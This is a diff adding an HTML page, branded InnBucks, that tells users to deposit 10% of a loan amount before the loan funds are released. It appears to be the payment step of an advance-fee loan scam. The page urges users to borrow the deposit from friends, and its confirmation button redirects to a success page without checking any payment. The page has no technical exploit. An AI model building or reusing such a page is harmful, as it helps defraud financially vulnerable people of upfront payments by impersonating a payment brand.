@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Deposit Instructions</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+
+body{
+  font-family:'Poppins',sans-serif;
+  background:#1f2235;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#fff;
+}
+
+/* ===== CARD ===== */
+.card{
+  width:92%;
+  max-width:420px;
+  background:#232744;
+  border-radius:26px;
+  padding:28px 22px;
+  box-shadow:0 30px 70px rgba(0,0,0,.65);
+  animation:slideUp .7s ease;
+  border:1px solid rgba(255,255,255,.08);
+}
+
+/* ===== LOGO ===== */
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:10px;
+  margin-bottom:20px;
+}
+
+.dots{
+  display:grid;
+  grid-template-columns:repeat(2,12px);
+  gap:5px;
+}
+
+.dot{width:12px;height:12px;border-radius:50%}
+.dot1{background:#ffb300}
+.dot2{background:#8e24aa}
+.dot3{background:#43a047}
+.dot4{background:#e53935}
+
+.logo h3{
+  font-weight:600;
+  letter-spacing:.5px;
+}
+
+/* ===== AMOUNT ===== */
+.amount{
+  font-size:36px;
+  font-weight:600;
+  text-align:center;
+  margin-bottom:22px;
+  color:#4dabf7;
+}
+
+/* ===== TITLE ===== */
+h3{
+  margin-bottom:15px;
+  text-align:center;
+}
+
+/* ===== STEPS ===== */
+.steps{
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+  margin-bottom:22px;
+}
+
+.step{
+  display:flex;
+  gap:12px;
+  font-size:14px;
+  color:#cbd5f5;
+  line-height:1.6;
+}
+
+.step span{
+  min-width:26px;
+  height:26px;
+  background:linear-gradient(135deg,#355d8c,#4dabf7);
+  color:#fff;
+  border-radius:50%;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:13px;
+  font-weight:600;
+}
+
+/* ===== TIP ===== */
+.tip{
+  background:rgba(255,193,7,.08);
+  border:1px solid rgba(255,193,7,.4);
+  border-radius:18px;
+  padding:16px;
+  font-size:14px;
+  color:#fde68a;
+  margin-bottom:18px;
+  animation:fadeIn .6s ease;
+}
+
+.tip strong{
+  display:block;
+  margin-bottom:6px;
+  color:#facc15;
+}
+
+/* ===== CONFIRM ===== */
+.confirm{
+  background:rgba(34,197,94,.1);
+  border:1px solid rgba(34,197,94,.6);
+  border-radius:18px;
+  padding:14px;
+  font-size:14px;
+  color:#86efac;
+  margin-bottom:22px;
+}
+
+/* ===== BUTTON ===== */
+button{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:20px;
+  background:linear-gradient(135deg,#355d8c,#4dabf7);
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+  transition:.3s;
+}
+
+button:hover{
+  transform:translateY(-2px);
+  box-shadow:0 12px 28px rgba(77,171,247,.45);
+}
+
+/* ===== ANIMATIONS ===== */
+@keyframes slideUp{
+  from{transform:translateY(40px);opacity:0}
+  to{transform:translateY(0);opacity:1}
+}
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(10px)}
+  to{opacity:1;transform:translateY(0)}
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <div class="dots">
+      <div class="dot dot1"></div>
+      <div class="dot dot2"></div>
+      <div class="dot dot3"></div>
+      <div class="dot dot4"></div>
+    </div>
+    <h3>InnBucks</h3>
+  </div>
+
+  <div class="amount" id="depositAmount">$0</div>
+
+  <h3>Deposit Instructions</h3>
+
+  <div class="steps">
+    <div class="step"><span>1</span> Open your InnBucks STK application on your phone.</div>
+    <div class="step"><span>2</span> Select <strong>“Send Money”</strong> or <strong>“Deposit”</strong>.</div>
+    <div class="step"><span>3</span> Enter your <strong>InnBucks account number</strong>.</div>
+    <div class="step"><span>4</span> Enter the amount shown above (or more).</div>
+    <div class="step"><span>5</span> Confirm the transaction and complete the deposit.</div>
+    <div class="step"><span>6</span> Wait for the confirmation SMS from InnBucks.</div>
+  </div>
+
+  <div class="tip">
+    <strong>💡 Helpful Tip</strong>
+    If you do not have the 10% available, ask a friend to send the cash to your InnBucks account,
+    then you can send it back after qualification.
+  </div>
+
+  <div class="confirm">
+    ✅ Once the deposit is confirmed, you will be able to use your loan funds.
+  </div>
+
+  <button onclick="completeDeposit()">✔ I've Completed the Deposit</button>
+
+</div>
+
+<script>
+/* ===== CALCULATE 10% DEPOSIT ===== */
+const loanAmount = Number(localStorage.getItem("loanAmount")) || 600;
+const deposit = (loanAmount * 0.10).toFixed(2);
+document.getElementById("depositAmount").textContent = "$" + deposit;
+
+/* ===== REDIRECT ===== */
+function completeDeposit(){
+  window.location.href = "success.html";
+}
+</script>
+
+</body>
+</html>
